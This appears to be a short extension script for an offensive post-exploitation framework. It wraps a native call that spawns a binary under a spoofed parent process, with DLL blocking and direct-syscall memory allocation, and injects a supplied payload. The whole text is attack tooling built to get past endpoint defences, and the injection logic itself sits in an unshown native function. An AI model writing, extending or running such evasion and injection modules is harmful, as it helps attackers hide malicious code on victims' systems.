// Usage: extension load inject_spawn_advanced <binary_path> <parent_pid> <payload>
// Techniques: PPID Spoofing, BlockDLLs, Direct Syscall (Alloc)

if args.len() < 3 { return "Usage: <binary> <parent_pid> <payload>"; }

print_log("Spawning " + args[0] + " as child of " + args[1] + " (BlockDLLs ON)...");
return native_inject_spawn_advanced(args[0], args[1], args[2]);
